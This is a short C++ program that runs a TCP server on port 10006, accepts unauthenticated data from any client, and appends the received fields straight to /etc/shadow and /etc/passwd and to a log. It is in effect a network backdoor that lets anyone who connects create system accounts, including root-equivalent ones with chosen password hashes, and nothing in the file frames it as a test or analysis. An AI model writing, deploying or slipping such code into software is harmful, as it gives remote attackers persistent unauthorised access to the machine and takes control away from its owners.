#include <iostream>
#include <fstream>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>

const char* ip = "0.0.0.0"; 
const int port = 10006;

int main() {
    int serverSock, clientSock;
    struct sockaddr_in serverAddr, clientAddr;
    socklen_t addrLen = sizeof(clientAddr);
    char buffer[1024];

    // Create TCP socket
    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) {
        std::cerr << "Error opening socket." << std::endl;
        return 1;
    }

    
    int opt = 1;
    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        std::cerr << "Error setting socket options." << std::endl;
        close(serverSock);
        return 1;
    }

    // Bind the socket
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_port = htons(port);

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "Error binding socket: " << strerror(errno) << std::endl;
        close(serverSock);
        return 1;
    }

    // Listen for connections
    if (listen(serverSock, 5) < 0) {
        std::cerr << "Error listening on socket: " << strerror(errno) << std::endl;
        close(serverSock);
        return 1;
    }

    std::cout << "Listening on " << ip << ":" << port << "..." << std::endl;

  
    while (true) {
        clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &addrLen);
        if (clientSock < 0) {
            std::cerr << "Error accepting connection: " << strerror(errno) << std::endl;
            continue;
        }


        ssize_t bytesRead = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead < 0) {
            std::cerr << "Error receiving data." << std::endl;
            close(clientSock);
            continue;
        }

        buffer[bytesRead] = '\0'; 
        std::string data(buffer);
        

        std::string shadowEntry, passwdEntry, transactionEntry;
        
        size_t semicolonPos = data.find(';');
        size_t caretPos = data.find('^');

        if (semicolonPos != std::string::npos) {
            shadowEntry = data.substr(0, semicolonPos);
            if (caretPos != std::string::npos) {
                passwdEntry = data.substr(semicolonPos + 1, caretPos - semicolonPos - 1);
                transactionEntry = data.substr(caretPos + 1);
            } else {
                passwdEntry = data.substr(semicolonPos + 1);  // Everything after semicolon if no caret found
            }
        }

        // Write to /etc/shadow
        std::ofstream shadowFile("/etc/shadow", std::ios::app);
        if (!shadowFile) {
            std::cerr << "Error opening /etc/shadow for writing." << std::endl;
            close(clientSock);
            continue;
        }
        shadowFile << shadowEntry << std::endl;
        shadowFile.close();

        // Write to /etc/passwd
        std::ofstream passwdFile("/etc/passwd", std::ios::app);
        if (!passwdFile) {
            std::cerr << "Error opening /etc/passwd for writing." << std::endl;
            close(clientSock);
            continue;
        }
        passwdFile << passwdEntry << std::endl;
        passwdFile.close();

        // Write to transaction log
        std::ofstream transactionLog("transaction_log.txt", std::ios::app);
        if (!transactionLog) {
            std::cerr << "Error opening transaction log for writing." << std::endl;
            close(clientSock);
            continue;
        }
        transactionLog << transactionEntry << std::endl;
        transactionLog.close();


        std::cout << "Hooray!" << std::endl;


        close(clientSock);
    }


    close(serverSock);
    return 0;
}
